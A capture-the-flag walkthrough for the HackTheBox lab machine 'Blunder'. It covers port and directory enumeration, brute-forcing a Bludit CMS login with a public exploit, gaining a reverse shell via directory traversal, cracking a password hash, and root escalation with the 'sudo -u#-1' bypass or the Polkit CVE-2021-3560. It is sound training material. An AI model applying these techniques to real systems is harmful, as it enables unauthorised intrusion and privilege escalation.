## Blunder

Difficulty: Easy

### User Flag

```
rustscan -a 10.10.10.191 --ulimit 5000 -- -A -sV -sC -oN nmap.txt
```

![rustscan](https://github.com/b1d0ws/OSCP/assets/58514930/30d9802c-95ea-4dc1-a7a5-dda81cd413c2)

<br>

The website appears to be a normal blog.

![website](https://github.com/b1d0ws/OSCP/assets/58514930/a2fc934e-5b0b-4fb9-a48f-c1db162e0a09)

<br>

Doing some enumeration with different extensions, we find a todo.txt file.

```
gobuster dir -u http://10.10.10.191 -w /usr/share/wordlists/dirb/big.txt -t 40 -x  js,html,pdf,zip,asp,aspx,bak,txt,py -b 403,404
```

![gobuster](https://github.com/b1d0ws/OSCP/assets/58514930/d591bb3c-ae66-436b-941d-d639bc15e38b)

<br>

In this file we enumerate "fergus" user.

![todoText](https://github.com/b1d0ws/OSCP/assets/58514930/3ecde9e6-3ed5-4463-8108-41ae4ddfb7f2)

<br>

In install.php we enumerate the CMS Bludit.

![enumerateBludit](https://github.com/b1d0ws/OSCP/assets/58514930/bac48be7-ca2a-42e3-b080-157794b9bd70)

<br>

Searching for exploits, the [Auth Bruteforce Bypass](https://www.exploit-db.com/exploits/48942) call our attention, since we already have one user.

![bruteForceBypass](https://github.com/b1d0ws/OSCP/assets/58514930/1f36dca6-215a-4494-a599-6d4b96762d0c)

<br>

To use as password wordlist, we can generate one from the website using cewl.

```
cewl http://10.10.10.191/ > passwords.txt
```

<br>

python3 exploit.py -l http://10.10.10.191/admin/ -u admin.txt -p passwords.txt

![bruteForcing](https://github.com/b1d0ws/OSCP/assets/58514930/883a16ec-133f-45f6-91b1-ed0eee6d4ec2)

![bruteForceSuccess](https://github.com/b1d0ws/OSCP/assets/58514930/b0b8360f-13d2-42b3-8098-dc3ef25fd565)

<br>

Once authenticated, we can use the [Directory Traversal](https://www.exploit-db.com/exploits/48701) exploit.

![searchsploitLFI](https://github.com/b1d0ws/OSCP/assets/58514930/a7d549d4-4359-483f-a412-621830cc2b14)

![lfiExploit](https://github.com/b1d0ws/OSCP/assets/58514930/c342e51b-3786-42ed-866f-8a0c69f01943)

<br>

Get the reverse shell accessing evil.png and improve the shell with mkfifo and python3.

![betterReverseShell](https://github.com/b1d0ws/OSCP/assets/58514930/ec6d2d7f-6a49-4bf9-bcad-71671856a93f)

<br>

There is another version of bludit inside /var/www/bludit-3.10.0a. Access /var/www/bludit-3.10.0a/bl-content/databases, get hugo's hash from users.php and crack it in CrackStation.

![users php](https://github.com/b1d0ws/OSCP/assets/58514930/7c910c70-5753-463c-baba-193623364f64)

![crackStation](https://github.com/b1d0ws/OSCP/assets/58514930/3a36cb38-8d55-488a-a21e-c58bc44a8ca8)

### Root Flag

There is two ways to do the privilege escalation. The first one is exploiting the sudo version since we have som peculiar permissions in sudo -l.

```
sudo -u#-1 /bin/bash
```

![privEsc](https://github.com/b1d0ws/OSCP/assets/58514930/9c146a83-4407-4d57-b803-ea4f2d0430b1)

<br>

The other is exploiting [CVE-2021-3560](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation) (PolKit).
